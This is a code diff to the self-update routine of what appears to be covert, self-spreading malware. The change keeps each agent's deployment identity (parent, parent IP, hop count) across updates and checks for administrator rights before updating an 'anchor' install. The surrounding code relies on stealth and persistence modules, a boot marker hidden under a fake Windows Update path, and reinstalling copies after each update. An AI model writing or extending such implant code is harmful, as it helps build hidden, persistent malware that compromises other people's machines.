@@ -16,6 +16,7 @@ from __future__ import annotations
 import compileall
 import hashlib
 import io
+import json
 import os
 import shutil
 import subprocess
@@ -30,6 +31,7 @@ from . import persistence, runtime, stealth
 IS_WINDOWS = os.name == "nt"
 CREATE_NEW_PROCESS_GROUP = 0x00000200 if IS_WINDOWS else 0
 BOOT_MARK = os.path.join(os.environ.get("PROGRAMDATA") or tempfile.gettempdir(), "Microsoft", "WindowsUpdate", "boot")
+PRESERVED_DEPLOY_KEYS = ("salt", "parent", "parent_ip", "hop", "group", "protected")
 
 
 def _sha256(data: bytes) -> str:
@@ -65,6 +67,52 @@ def _remove(path: str) -> None:
             pass
 
 
+def _preserve_identity(bundle_root: str) -> dict[str, object]:
+    """Read per-agent deployment state before the update replaces the bundle."""
+    path = os.path.join(bundle_root, "deploy.json")
+    try:
+        with open(path, "r", encoding="utf-8-sig") as handle:
+            data = json.load(handle)
+    except (OSError, ValueError):
+        return {}
+    if not isinstance(data, dict):
+        return {}
+    return {
+        key: data[key]
+        for key in PRESERVED_DEPLOY_KEYS
+        if key in data
+    }
+
+
+def _restore_identity(bundle_root: str, preserved: dict[str, object]) -> None:
+    if not preserved:
+        return
+    path = os.path.join(bundle_root, "deploy.json")
+    try:
+        with open(path, "r", encoding="utf-8-sig") as handle:
+            merged = json.load(handle)
+    except (OSError, ValueError):
+        merged = {}
+    if not isinstance(merged, dict):
+        merged = {}
+    merged.update(preserved)
+    temporary = path + ".tmp"
+    try:
+        with open(temporary, "w", encoding="utf-8") as handle:
+            json.dump(merged, handle, indent=1)
+        os.replace(temporary, path)
+    except OSError:
+        _remove(temporary)
+        raise
+
+
+def _anchor_requires_elevation() -> bool:
+    if not IS_WINDOWS or stealth.is_admin():
+        return False
+    directories = stealth.install_directories()
+    return len(directories) >= 3 and os.path.isdir(directories[2])
+
+
 def write_boot_marker() -> None:
     """Called by a freshly started agent so its parent knows it survived."""
     entry = os.path.join(stealth.bundle_root(), "agent.py")
@@ -84,7 +132,11 @@ def apply(archive: bytes, expected_sha: str = "",
         return False, "archive hash mismatch"
     if len(archive) < 256:
         return False, "archive suspiciously small"
+    if _anchor_requires_elevation():
+        return False, "administrator privileges required to update the anchor"
 
+    root = stealth.bundle_root()
+    preserved_identity = _preserve_identity(root)
     staging = os.path.join(stealth.primary_directory(), ".staging")
     _remove(staging)
     os.makedirs(staging, exist_ok=True)
@@ -102,11 +154,16 @@ def apply(archive: bytes, expected_sha: str = "",
     if not compileall.compile_dir(staging, quiet=2, force=True):
         return False, "compilation failed"
 
-    root = stealth.bundle_root()
     try:
         _swap(staging, root)
     except OSError as error:
         return False, f"swap failed: {error}"
+
+    try:
+        _restore_identity(root, preserved_identity)
+    except OSError as error:
+        rollback()
+        return False, f"could not preserve deployment identity: {error}"
 
     persistence.install_copies()
 
